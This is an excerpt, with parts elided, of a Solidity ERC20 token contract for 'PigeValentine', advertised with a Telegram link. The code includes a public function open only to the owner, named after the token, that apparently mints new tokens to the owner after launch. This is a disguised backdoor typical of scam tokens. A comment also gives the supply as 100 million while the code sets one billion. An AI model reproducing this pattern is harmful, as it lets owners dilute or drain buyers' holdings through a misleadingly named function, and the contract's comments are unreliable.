...
//
// $PigeValentine proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PigeValentine
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PigeValentine(uint256 amount) public onlyOwner {
 _PigeValentine(msg.sender, amount);
    }
    ...
    function _PigeValentine(address account, uint256 amount) internal virtual {
...
contract $PigeValentine is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pige Valentine", "PIGEVAL") {
     _PigeValentine(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}